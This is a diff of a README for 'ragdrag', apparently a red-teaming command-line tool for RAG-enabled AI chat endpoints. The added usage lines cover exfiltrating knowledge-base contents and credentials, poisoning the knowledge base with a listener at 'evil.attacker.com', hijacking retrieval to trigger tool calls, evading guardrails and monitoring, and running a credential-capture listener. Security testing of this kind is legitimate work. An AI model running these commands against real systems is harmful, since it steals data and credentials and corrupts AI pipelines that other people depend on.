@@ -34,11 +34,23 @@ Point ragdrag at any RAG-enabled endpoint:
 # Fingerprint: is it RAG? What vector DB?
 ragdrag fingerprint -t https://your-target.com/api/chat
 
-# Exfiltrate: what's in the knowledge base?
-ragdrag exfiltrate -t https://your-target.com/api/chat
+# Probe: map chunk boundaries, retrieval thresholds, KB scope
+ragdrag probe -t https://your-target.com/api/chat --depth full
 
-# Exfiltrate with guardrail bypass techniques
+# Exfiltrate: what's in the knowledge base?
 ragdrag exfiltrate -t https://your-target.com/api/chat --deep
+
+# Poison: inject documents, plant credential traps
+ragdrag poison -t https://your-target.com/api/chat --listener evil.attacker.com
+
+# Hijack: redirect retrieval, saturate context, trigger tool calls
+ragdrag hijack -t https://your-target.com/api/chat --callback https://your-listener.com
+
+# Evade: test guardrail bypass techniques
+ragdrag evade -t https://your-target.com/api/chat
+
+# Full kill chain (all 6 phases)
+ragdrag scan -t https://your-target.com/api/chat
 
 # Capture leaked credentials from URL fetcher exploitation
 ragdrag listen --port 8443
@@ -47,7 +59,7 @@ ragdrag listen --port 8443
 ragdrag fingerprint -t https://your-target.com/api/chat -o findings.json
 ```
 
-That's it. No setup beyond `pip install`. Point it at a target and go.
+No setup beyond `pip install`. Point it at a target and go.
 
 ### Test Lab (Optional)
 
@@ -62,7 +74,7 @@ The lab servers require [Ollama](https://ollama.com/) with any model pulled. Def
 ollama pull llama3.2
 
 # Start the open (no guardrails) lab server
-cd RAGdrag-labs
+cd ragdrag-labs
 pip install -e .
 python targets/rag_server.py
 
@@ -82,6 +94,9 @@ See the [RAGdrag-labs README](https://github.com/McKern3l/RAGdrag-labs) for all 
 | `fingerprint` | R1: Detect RAG presence and identify vector database technology |
 | `probe` | R2: Map pipeline internals (chunk sizing, thresholds, KB scope) |
 | `exfiltrate` | R3: Extract knowledge base contents and credentials |
+| `poison` | R4: Inject attacker-controlled content into the knowledge base |
+| `hijack` | R5: Take control of RAG pipeline retrieval and generation |
+| `evade` | R6: Test evasion techniques against guardrails and monitoring |
 | `scan` | Run multiple kill chain phases against a target |
 | `listen` | Start a credential capture HTTP listener for RD-0304/RD-0403 |
 | `report` | Generate JSON reports from findings |
